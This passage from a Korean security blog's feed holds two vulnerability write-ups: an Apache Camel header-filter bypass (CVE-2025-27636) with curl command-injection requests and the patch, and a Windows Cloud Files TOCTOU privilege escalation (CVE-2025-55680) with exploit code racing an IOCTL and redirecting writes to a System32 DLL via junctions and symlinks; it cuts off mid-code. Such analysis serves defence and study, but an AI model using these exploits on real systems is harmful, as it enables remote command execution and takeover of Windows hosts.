&#xBC29;&#xC2DD;(case-sensitive)&#xC73C;&#xB85C;&#xB9CC; &#xC815;&#xD655;&#xD55C; &#xC77C;&#xCE58;&#xB97C; &#xAC80;&#xC0AC;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD544;&#xD130;&#xB9C1; &#xC870;&#xAC74;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python">header.startsWith(<span class="hljs-string">&quot;Camel&quot;</span>) || header.startsWith(<span class="hljs-string">&quot;camel&quot;</span>) || header.startsWith(<span class="hljs-string">&quot;org.apache.camel&quot;</span>)</code></pre><p>&#xADF8;&#xB7EC;&#xB098; &#xB2E4;&#xC6B4;&#xC2A4;&#xD2B8;&#xB9BC; &#xB85C;&#xC9C1;&#xC5D0;&#xC11C; &#xC774;&#xB7EC;&#xD55C; &#xD5E4;&#xB354;&#xB4E4;&#xC774; &#xB300;&#xC18C;&#xBB38;&#xC790;&#xB97C; &#xAD6C;&#xBD84;&#xD558;&#xC9C0; &#xC54A;&#xB294; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xC801;&#xC6A9;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xD5E4;&#xB354;&#xC758; &#xB300;&#xC18C;&#xBB38;&#xC790;&#xB97C; &#xBCC0;&#xACBD;&#xD558;&#xBA74;(&#xC608;: CAmelExecCommandExecutable, cAMELHttpResponseCode), &#xD544;&#xD130;&#xB97C; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a><strong>PoC</strong></h3><p>Akamai&#xB294; Camel&#xC758; Exec &#xCEF4;&#xD3EC;&#xB10C;&#xD2B8;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xC0D8;&#xD50C; &#xCDE8;&#xC57D;&#xD55C; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC744; &#xC81C;&#xC791;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC740; HTTP &#xC5D4;&#xB4DC;&#xD3EC;&#xC778;&#xD2B8;&#xB97C; &#xB178;&#xCD9C;&#xD558;&#xACE0;, &#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C;&#xB294; &#x201C;whoami&#x201D; &#xBA85;&#xB839;&#xC744; &#xC815;&#xC801;&#xC73C;&#xB85C; &#xC815;&#xC758;&#xD558;&#xC5EC; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs java">from(<span class="hljs-string">&quot;jetty:http://0.0.0.0:80/vulnerable&quot;</span>)    .log(<span class="hljs-string">&quot;Received request from client&quot;</span>)    <span class="hljs-comment">// define a static command. This can be overwritten using the &quot;CamelExecCommandExecutable&quot; header</span>    .to(<span class="hljs-string">&quot;exec:whoami&quot;</span>)     .convertBodyTo(String.class)     .log(<span class="hljs-string">&quot;Command Output: ${body}&quot;</span>);</code></pre><p>&#xBA85;&#xB839;&#xC774; &#xC815;&#xC801;&#xC73C;&#xB85C; &#xC815;&#xC758;&#xB418;&#xC5B4; &#xC788;&#xC74C;&#xC5D0;&#xB3C4; &#xBD88;&#xAD6C;&#xD558;&#xACE0;, CamelExecCommandExecutable &#xD5E4;&#xB354;&#xB97C; &#xC804;&#xB2EC;&#xD558;&#xC5EC; &#xBA85;&#xB839;&#xC744; &#xC7AC;&#xC815;&#xC758;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xD5E4;&#xB354;&#xB294; Apache Camel <a href="https://camel.apache.org/security/">&#xACF5;&#xC2DD; &#xBB38;&#xC11C;</a>&#xC5D0; &#xBA85;&#xC2DC;&#xB418;&#xC5B4; &#xC788;&#xB4EF;&#xC774; &#xC815;&#xC801; URI&#xB97C; &#xB36E;&#xC5B4;&#xC50C;&#xC6C1;&#xB2C8;&#xB2E4;. Apache Camel&#xC740; &#xC774;&#xB7EC;&#xD55C; &#xD5E4;&#xB354;&#xB97C; &#xD544;&#xD130;&#xB9C1;&#xD574;&#xC57C; &#xD558;&#xC9C0;&#xB9CC;, &#xB300;&#xC18C;&#xBB38;&#xC790; &#xCC98;&#xB9AC; &#xC624;&#xB958;&#xB85C; &#xC778;&#xD574; &#x201C;CAmelExecCommandExecutable&#x201D; &#xD5E4;&#xB354;&#xB97C; &#xC804;&#xB2EC;&#xD558;&#xBA74; &#xD544;&#xD130;&#xB97C; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><strong>&#xC815;&#xC0C1; &#xC694;&#xCCAD;</strong></p><pre><code class="hljs python">$ curl <span class="hljs-string">&quot;http://localhost:80/vulnerable&quot;</span> --header <span class="hljs-string">&quot;CamelExecCommandExecutable: ls&quot;</span>kali</code></pre><p><strong>&#xC545;&#xC758;&#xC801; &#xC694;&#xCCAD; (&#xBA85;&#xB839; &#xBCC0;&#xACBD;)</strong></p><pre><code class="hljs bash">$ curl <span class="hljs-string">&quot;http://localhost:80/vulnerable&quot;</span> --header <span class="hljs-string">&quot;CAmelExecCommandExecutable: ls&quot;</span>pom.xmlsrctarget</code></pre><p><strong>&#xC545;&#xC758;&#xC801; &#xC694;&#xCCAD; (&#xBBFC;&#xAC10; &#xC815;&#xBCF4; &#xC720;&#xCD9C;)</strong></p><pre><code class="hljs bash">*$ curl <span class="hljs-string">&quot;http://localhost:80/vulnerable&quot;</span> --header <span class="hljs-string">&quot;CAmelExecCommandExecutable: ping&quot;</span> --header <span class="hljs-string">&quot;CAmelExecCommandArgs: -c 2 8.8.8.8&quot;</span>PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.64 bytes from 8.8.8.8: icmp_seq=1 ttl=128 time=98.9 ms64 bytes from 8.8.8.8: icmp_seq=2 ttl=128 time=46.4 ms--- 8.8.8.8 ping statistics ---2 packets transmitted, 2 received, 0% packet loss, time 1012ms<span class="hljs-comment"># &#xACB0;&#xACFC;: /etc/passwd &#xD30C;&#xC77C; &#xB0B4;&#xC6A9; &#xD45C;&#xC2DC;*</span></code></pre><p><code>CAmelExecCommandExecutable</code>&#xACFC; <code>CAmelExecCommandArgs</code> &#xD5E4;&#xB354;&#xB97C; &#xBAA8;&#xB450; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC784;&#xC758;&#xC758; &#xBA85;&#xB839;&#xACFC; &#xC778;&#xC218;&#xB97C; &#xC9C0;&#xC815;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xACBD;&#xC6B0; ping &#xBA85;&#xB839;&#xC774; &#xC2E4;&#xD589;&#xB418;&#xACE0; &#xACB0;&#xACFC;&#xAC00; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC5D0; &#xBC18;&#xD658;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC131;&#xACF5;&#xC801; &#xC545;&#xC6A9; &#xC2DC;, &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC9C0;&#xC815;&#xD55C; &#xC2DC;&#xC2A4;&#xD15C; &#xBA85;&#xB839;&#xC774; Camel &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; &#xAD8C;&#xD55C;(&#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; <code>root</code>)&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</p><h3 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h3><p>Apache&#xB294; DefaultHeaderFilterStrategy.java&#xC758; &#xD544;&#xD130;&#xB9C1; &#xB85C;&#xC9C1;&#xC744; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xD558;&#xC5EC; <code>toLowerCase(Locale.ENGLISH)</code>&#xB97C; &#xCD94;&#xAC00;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBAA8;&#xB4E0; &#xD5E4;&#xB354; &#xC774;&#xB984;&#xC774; &#xD544;&#xD130; &#xC801;&#xC6A9; &#xC804;&#xC5D0; &#xC18C;&#xBB38;&#xC790;&#xB85C; &#xBCC0;&#xD658;&#xB418;&#xB3C4;&#xB85D; &#xBCC0;&#xACBD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python">java*// &#xC218;&#xC815;&#xB41C; &#xD544;&#xD130;&#xB9C1; &#xB85C;&#xC9C1;*String name = header.toLowerCase(Locale.ENGLISH);<span class="hljs-keyword">if</span> (name.startsWith(<span class="hljs-string">&quot;camel&quot;</span>) || name.startsWith(<span class="hljs-string">&quot;org.apache.camel&quot;</span>)) {    <span class="hljs-keyword">return</span> true; *// &#xD544;&#xD130;&#xB9C1;&#xB428;*}</code></pre><p>&#xC608;&#xB97C; &#xB4E4;&#xC5B4;, CAmelHttpUri&#xB294; camelhttpuri&#xB85C; &#xBCC0;&#xD658;&#xB418;&#xC5B4; &#xD544;&#xD130; &#xC870;&#xAC74;&#xACFC; &#xC77C;&#xCE58;&#xD558;&#xBBC0;&#xB85C; &#xCC28;&#xB2E8;&#xB429;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://github.com/akamai/CVE-2025-27636-Apache-Camel-PoC">https://github.com/akamai/CVE-2025-27636-Apache-Camel-PoC</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/RCE/">RCE</category>
      
      <category domain="https://hackyboiz.github.io/tags/clalxk/">clalxk</category>
      
      <category domain="https://hackyboiz.github.io/tags/Apache-Software-Foundation/">Apache Software Foundation</category>
      
      <category domain="https://hackyboiz.github.io/tags/Apache-Camel/">Apache Camel</category>
      
      <category domain="https://hackyboiz.github.io/tags/Case-Sensitive-Header-Filtering-Bypass/">Case-Sensitive Header Filtering Bypass</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2025-27636/">CVE-2025-27636</category>
      
      
      <comments>https://hackyboiz.github.io/2025/11/26/clalxk/CVE-2025-27636/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-55680: Windows Cloud Files 미니필터 드라이버(cldflt.sys)의 TOCTOU 레이스 컨디션을 통한 LPE 취약점</title>
      <link>https://hackyboiz.github.io/2025/11/22/banda/CVE-2025-55680/</link>
      <guid>https://hackyboiz.github.io/2025/11/22/banda/CVE-2025-55680/</guid>
      <pubDate>Sat, 22 Nov 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://ssd-disclosure.com/cloud-filter-arbitrary-f</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://ssd-disclosure.com/cloud-filter-arbitrary-file-creation-eop-patch-bypass-lpe">https://ssd-disclosure.com/cloud-filter-arbitrary-file-creation-eop-patch-bypass-lpe</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>2025&#xB144; 10&#xC6D4; 14&#xC77C;&#xC790; Microsoft &#xC815;&#xAE30; &#xBCF4;&#xC548; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xC801;&#xC6A9; &#xC774;&#xC804;&#xC758; Windows 10/11 &#xD658;&#xACBD;</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>CVE-2025-55680&#xC740; &#xC6D0;&#xB798; 2020&#xB144; Microsoft&#xAC00; &#xD328;&#xCE58;&#xD588;&#xB358; Arbitrary File Creation EoP &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xB300;&#xD574;&#xC11C;, TOCTOU &#xB808;&#xC774;&#xC2A4; &#xC870;&#xAC74;&#xC744; &#xC774;&#xC6A9;&#xD574; &#xC6B0;&#xD68C; &#xACF5;&#xACA9;&#xC774; &#xB2E4;&#xC2DC; &#xAC00;&#xB2A5;&#xD574;&#xC9C4; &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; Windows Cloud Files Mini Filter Driver&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h3><pre><code class="hljs cpp"><span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )      {        v23 = *(_WORD *)((<span class="hljs-keyword">char</span> *)v52 + <span class="hljs-number">2</span> * v22 + epi16);        <span class="hljs-keyword">if</span> ( v23 == <span class="hljs-string">&apos;\\&apos;</span> || v23 == <span class="hljs-string">&apos;:&apos;</span> )          <span class="hljs-keyword">break</span>;        <span class="hljs-keyword">if</span> ( ++v22 &gt;= (<span class="hljs-keyword">unsigned</span> __int16)(WORD1(v18) &gt;&gt; <span class="hljs-number">1</span>) )          <span class="hljs-keyword">goto</span> LABEL_51;      }</code></pre><p>&#xAE30;&#xC874;&#xC758; &#xAC80;&#xC0AC; &#xCF54;&#xB4DC;&#xB294; &#xACBD;&#xB85C;&#xC5D0; <code>\</code>&#xD639;&#xC740; <code>:</code>&#xBB38;&#xC790;&#xAC00; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xB294;&#xC9C0; &#xAC80;&#xC0AC;&#xD558;&#xACE0;, &#xACBD;&#xB85C;&#xC5D0; &#xD574;&#xB2F9; &#xBB38;&#xC790;&#xAC00; &#xC788;&#xC73C;&#xBA74; &#xD30C;&#xC77C; &#xC0DD;&#xC131;&#xC774; &#xCC28;&#xB2E8;&#xB418;&#xB294; &#xD750;&#xB984;&#xC744; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp">ProbeForRead(a4, Length, <span class="hljs-number">4u</span>);  MmProbeAndLockPages(MemoryDescriptorList, <span class="hljs-number">1</span>, IoReadAccess);  <span class="hljs-keyword">if</span> ( (MemoryDescriptorList-&gt;MdlFlags &amp; <span class="hljs-number">5</span>) != <span class="hljs-number">0</span> )    MappedSystemVa = (<span class="hljs-keyword">char</span> *)MemoryDescriptorList-&gt;MappedSystemVa;  <span class="hljs-keyword">else</span>    MappedSystemVa = (<span class="hljs-keyword">char</span> *)MmMapLockedPagesSpecifyCache(MemoryDescriptorList, <span class="hljs-number">0</span>, MmCached, <span class="hljs-number">0</span>i64, <span class="hljs-number">0</span>, <span class="hljs-number">0x40000010</span>u);  v46 = MappedSystemVa;</code></pre><p><code>ProbeForRead</code>&#xC640; <code>MmProbeAndLockPages</code>&#xB85C; &#xD398;&#xC774;&#xC9C0;&#xB97C; &#xB77D;(lock)&#xD55C; &#xD6C4; &#xBB38;&#xC790;&#xC5F4; &#xAC80;&#xC0AC;&#xB97C; &#xC218;&#xD589;&#xD558;&#xACE0; &#xC788;&#xC9C0;&#xB9CC;, &#xC774;&#xB294; &#xD398;&#xC774;&#xC9C0;&#xB97C; &#xACE0;&#xC815;&#xD560; &#xBFD0; &#xB0B4;&#xC6A9; &#xC790;&#xCCB4;&#xB97C; &#xB3D9;&#xACB0;&#xC2DC;&#xD0A4;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xD574;&#xB2F9; &#xBC84;&#xD37C;&#xB294; &#xC5EC;&#xC804;&#xD788; UserMode&#xC5D0;&#xC11C;&#xB3C4; &#xC4F0;&#xAE30;&#xAC00; &#xAC00;&#xB2A5;&#xD558;&#xACE0;, &#xCEE4;&#xB110;&#xC774; &#xBB38;&#xC790;&#xC5F4; &#xAC80;&#xC0AC;&#xB97C; &#xC218;&#xD589;&#xD55C; &#xC9C1;&#xD6C4;&#xB098; &#xAC80;&#xC99D;&#xACFC; &#xC2E4;&#xC81C; &#xC0AC;&#xC6A9; &#xC0AC;&#xC774; &#xD0C0;&#xC774;&#xBC0D;&#xC5D0; &#xAC12;&#xC774; &#xBC14;&#xB014; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xB54C;&#xBB38;&#xC5D0; &#xAC80;&#xC0AC; &#xC2DC;&#xC810;&#xC5D0;&#xB294; &#xC815;&#xC0C1;&#xC73C;&#xB85C; &#xBCF4;&#xC600;&#xB358; &#xACBD;&#xB85C;&#xAC00; &#xC0AC;&#xC6A9; &#xC2DC;&#xC810;&#xC5D0;&#xB294; &#xB2E4;&#xB978; &#xAC12;&#xC73C;&#xB85C; &#xBC14;&#xB00C;&#xB294; TOCTOU &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h3><pre><code class="hljs cpp">DoStartSvc();_mkdir(<span class="hljs-string">&quot;C:\\ProgramData\\cldpwn&quot;</span>);_mkdir(<span class="hljs-string">&quot;C:\\ProgramData\\cldpwn\\boo&quot;</span>);HRESULT hr = CfRegisterSyncRoot(dir, &amp;reg, &amp;policies, CF_REGISTER_FLAG_DISABLE_ON_DEMAND_POPULATION_ON_ROOT);init_symlink();</code></pre><p>&#xBA3C;&#xC800; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC5D0; &#xC0AC;&#xC6A9;&#xD560; &#xD074;&#xB77C;&#xC6B0;&#xB4DC; &#xD544;&#xD130; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xAC00; &#xB85C;&#xB4DC;&#xB418;&#xB3C4;&#xB85D; &#xAD00;&#xB828; &#xC11C;&#xBE44;&#xC2A4;&#xB97C; &#xC2DC;&#xC791;&#xD55C; &#xB4A4;, &#xACF5;&#xACA9;&#xC5D0; &#xC0AC;&#xC6A9;&#xD560; &#xC784;&#xC758;&#xC758; &#xACBD;&#xB85C;(<code>C:\ProgramData\cldpwn</code> &#xBC0F; &#xADF8; &#xD558;&#xC704; &#xB514;&#xB809;&#xD1A0;&#xB9AC;)&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; &#xC774; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xB97C; Windows Cloud Filter Sync Root&#xB85C; &#xB4F1;&#xB85D;&#xD574;, &#xD574;&#xB2F9; &#xACBD;&#xB85C; &#xC544;&#xB798;&#xC758; &#xD30C;&#xC77C; &#xC0DD;&#xC131; &#xC694;&#xCCAD;&#xC774; &#xD074;&#xB77C;&#xC6B0;&#xB4DC; &#xD544;&#xD130; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB97C; &#xBC18;&#xB4DC;&#xC2DC; &#xAC70;&#xCE58;&#xB3C4;&#xB85D; &#xB9CC;&#xB4ED;&#xB2C8;&#xB2E4;. (<a href="https://hackyboiz.github.io/2025/08/15/banda/Minifilter-Driver/ko/">&#xD544;&#xD130; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC640; Sync Root</a> &#x1F448;)</p><pre><code class="hljs cpp"><span class="hljs-keyword">wchar_t</span> path[] = <span class="hljs-string">L&quot;boo16.txt&quot;</span>;createthread test = (createthread)GetProcAddress(LoadLibraryA(<span class="hljs-string">&quot;ntdll.dll&quot;</span>), <span class="hljs-string">&quot;RtlCreateUserThread&quot;</span>);HANDLE a;<span class="hljs-keyword">char</span> buffer11[<span class="hljs-number">0x100</span>];*(WORD*)(tmp + <span class="hljs-number">0x8</span>) = <span class="hljs-number">0x100</span>;*(WORD*)(tmp + <span class="hljs-number">0xa</span>) = (lstrlenW(path)) * <span class="hljs-number">2</span>;*(WORD*)(tmp + <span class="hljs-number">0xc</span>) = <span class="hljs-number">0x20</span>;*(WORD*)(tmp + <span class="hljs-number">0xe</span>) = <span class="hljs-number">0x30</span>;<span class="hljs-built_in">memcpy</span>(tmp + <span class="hljs-number">0x100</span>, path, (lstrlenW(path) + <span class="hljs-number">1</span>) * <span class="hljs-number">2</span>);    ...*(<span class="hljs-keyword">int</span>*)inbuffer = <span class="hljs-number">0x9000001A</span>;*(<span class="hljs-keyword">int</span>*)(inbuffer + <span class="hljs-number">4</span>) = <span class="hljs-number">0xC0000001</span>;*(<span class="hljs-keyword">int</span>*)(inbuffer + <span class="hljs-number">8</span>) = <span class="hljs-number">0x1</span>;*(<span class="hljs-keyword">int</span>*)(inbuffer + <span class="hljs-number">16</span>) = <span class="hljs-number">0x200</span>;*(<span class="hljs-keyword">char</span>**)(inbuffer + <span class="hljs-number">24</span>) = tmp;<span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) {        *(<span class="hljs-keyword">char</span>*)(tmp + <span class="hljs-number">0x106</span>) = <span class="hljs-number">0x31</span>;        *(<span class="hljs-keyword">char</span>*)(tmp + <span class="hljs-number">0x11a</span>) = <span class="hljs-number">0x31</span>;        DeviceIoControl(dir_handle, <span class="hljs-number">0x903BC</span>, inbuffer, <span class="hljs-number">0x98</span>, outbuffer, <span class="hljs-number">0x1000</span>, &amp;BytesReturned, <span class="hljs-number">0</span>);    }</code></pre><p>&#xC774;&#xD6C4; <code>dir_handle</code>&#xC5D0; &#xB300;&#xD574; IOCTL(<code>0x903BC</code>)&#xC744; &#xBC18;&#xBCF5;&#xC801;&#xC73C;&#xB85C; &#xBCF4;&#xB0B4;&#xBA74;&#xC11C;, <code>boo16.txt</code>&#xB77C;&#xB294; &#xC774;&#xB984;&#xC758; placeholder &#xD30C;&#xC77C;&#xC744; &#xACC4;&#xC18D; &#xC0DD;&#xC131;&#xD558;&#xB3C4;&#xB85D; &#xC2DC;&#xB3C4;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; <code>inbuffer</code>&#xC758; &#xCCAB; &#xD544;&#xB4DC; <code>0x9000001A</code>&#xC640; &#xC0C1;&#xD0DC; &#xCF54;&#xB4DC; <code>0xC0000001</code>, <code>0xC0000007</code>&#xC740; &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C; &#xD074;&#xB77C;&#xC6B0;&#xB4DC; &#xD544;&#xD130; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0;&#xC11C; <code>HsmpOpCreatePlaceholders</code>&#xB85C; &#xB9E4;&#xD551;&#xB418;&#xB294; &#xC694;&#xCCAD; &#xD0C0;&#xC785;&#xACFC; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB85C; &#xD574;&#xC11D;&#xB429;&#xB2C8;&#xB2E4;. &#xC989;, &#xC774; &#xB8E8;&#xD504;&#xB97C; &#xD1B5;&#xD574; <code>C:\ProgramData\cldpwn</code> &#xC544;&#xB798;&#xC5D0;&#xC11C; placdholder &#xC0DD;&#xC131; &#xC694;&#xCCAD;&#xC744; &#xD3ED;&#xBC1C;&#xC801;&#xC73C;&#xB85C; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0A4;&#xB294; &#xD2B8;&#xB9AC;&#xAC70; &#xC5ED;&#xD560;&#xC744; &#xD558;&#xBA74;&#xC11C; &#xC774; &#xC2DC;&#xC810;&#xC758; &#xC785;&#xB825; &#xBC84;&#xD37C; <code>tmp</code>&#xAC00; &#xC774;&#xD6C4; TOCTOU &#xB808;&#xC774;&#xC2A4;&#xC758; &#xD0C0;&#xAC9F;&#xC774; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">thread1</span><span class="hljs-params">()</span> </span>{  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) {    Sleep(<span class="hljs-number">5</span>);    *(<span class="hljs-keyword">char</span> *)(tmp + <span class="hljs-number">0x106</span>) = <span class="hljs-number">0x5c</span>;  }}</code></pre><p>&#xACC4;&#xC18D; <code>boo16.txt</code>&#xC5D0; &#xB300;&#xD574; placeholder &#xD30C;&#xC77C; &#xC0DD;&#xC131; &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0B4;&#xB294; &#xB3D9;&#xC548;, <code>thread1()</code>&#xC5D0;&#xC11C;&#xB294; &#xB3D9;&#xC77C; &#xBC84;&#xD37C; <code>tmp</code>&#xB97C; &#xD2B9;&#xC815; &#xBC14;&#xC774;&#xD2B8;&#xB97C; <code>0x31(&apos;1&apos;)</code>&#xC5D0;&#xC11C; <code>0x5c(&apos;\\&apos;)</code>&#xB85C; &#xB36E;&#xC5B4; &#xACBD;&#xB85C; &#xBB38;&#xC790;&#xC5F4; &#xC77C;&#xBD80;&#xB97C; &#xC21C;&#xAC04;&#xC801;&#xC73C;&#xB85C; <code>boo\\6.txt</code> &#xD615;&#xD0DC;&#xAC00; &#xB418;&#xB3C4;&#xB85D; &#xC870;&#xC791;&#xD569;&#xB2C8;&#xB2E4;. &#xACBD;&#xB85C; &#xAC80;&#xC0AC; &#xB8E8;&#xD2F4;&#xC740; &#xC815;&#xC0C1;&#xC801;&#xC778; &#xAC12;&#xC77C; &#xB54C; &#xC548;&#xC804;&#xD55C; <code>boo16.txt</code> &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xD1B5;&#xACFC;&#xD558;&#xC9C0;&#xB9CC;, &#xAC80;&#xC0AC; &#xC9C1;&#xD6C4; thread1()&#xC774; &#xD574;&#xB2F9; &#xBC14;&#xC774;&#xD2B8;&#xB97C; <code>\</code>&#xB85C; &#xBC14;&#xAFD4; &#xB193;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xCEE4;&#xB110;&#xC774; &#xC77C;&#xC2DC;&#xC801;&#xC73C;&#xB85C; <code>boo\6.txt</code> &#xD615;&#xD0DC;&#xAC00; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-function">BOOL <span class="hljs-title">CreateJunction</span><span class="hljs-params">(LPCWSTR dir, LPCWSTR target)</span> </span>{  HANDLE hJunction;  DWORD cb;  <span class="hljs-keyword">wchar_t</span> printname[] = L <span class="hljs-string">&quot;&quot;</span>;  HANDLE hDir;  hDir = CreateFile(dir, FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ, <span class="hljs-literal">NULL</span>, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, <span class="hljs-literal">NULL</span>);...  <span class="hljs-keyword">if</span> (DeviceIoControl(hDir, FSCTL_SET_REPARSE_POINT, Data, Totalsize, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, &amp; cb, <span class="hljs-literal">NULL</span>) != <span class="hljs-number">0</span>) {    <span class="hljs-built_in">free</span>(Data);    <span class="hljs-keyword">return</span> TRUE;...}<span class="hljs-function">BOOL <span class="hljs-title">DosDeviceSymLink</span><span class="hljs-params">(LPCWSTR object, LPCWSTR target)</span> </span>{  <span class="hljs-keyword">if</span> (DefineDosDevice(DDD_NO_BROADCAST_SYSTEM | DDD_RAW_TARGET_PATH, object, target)) {    <span class="hljs-keyword">return</span> TRUE;...}</code></pre><p>&#xD55C;&#xD3B8; <code>CreateJunction()</code>&#xACFC; <code>DosDeviceSymLink()</code>&#xB97C; &#xD1B5;&#xD574; &#xACBD;&#xB85C; &#xD574;&#xC11D; &#xCCB4;&#xC778;&#xC744; &#xAD6C;&#xC131;&#xD574;&#xB461;&#xB2C8;&#xB2E4;. &#xBA3C;&#xC800; <code>C:\ProgramData\cldpwn\boo\</code> &#xB514;&#xB809;&#xD130;&#xB9AC;&#xB97C; NTFS junction&#xC73C;&#xB85C; &#xB9CC;&#xB4E4;&#xC5B4; NT &#xB124;&#xC784;&#xC2A4;&#xD398;&#xC774;&#xC2A4; &#xC0C1;  <code>\RPC Control</code>&#xC5D0; &#xC5F0;&#xACB0;&#xD558;&#xB3C4;&#xB85D; &#xC124;&#xC815;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xC5B4;&#xC11C; <code>GLOBAL\GLOBALROOT\RPC\Control\6.txt</code>&#xB97C; <code>\??\C:\Windows\System32\rasmxs.dll</code>&#xB85C; &#xD5A5;&#xD558;&#xB294; DOS &#xB514;&#xBC14;&#xC774;&#xC2A4; &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C;&#xB85C; &#xB4F1;&#xB85D;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xACB0;&#xACFC; &#xCEE4;&#xB110;&#xC774; &#xBCF4;&#xB294; &#xCD5C;&#xC885; &#xACBD;&#xB85C; &#xD750;&#xB984;&#xC740; <code>C:\ProgramData\cldpwn\boo\6.txt</code> &#x2192; <code>\RPC Control\6.txt</code> &#x2192; <code>C:\Windows\System32\rasmxs.dll</code>&#xAC00; &#xB418;&#xBA74;&#xC11C; &#xD574;&#xB2F9; &#xACBD;&#xB85C;&#xC5D0; &#xB300;&#xD574; &#xC4F0;&#xAE30; &#xAC00;&#xB2A5;&#xD55C; &#xD30C;&#xC77C; &#xD578;&#xB4E4;&#xC744; &#xC5F4;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp">CreateFile(<span 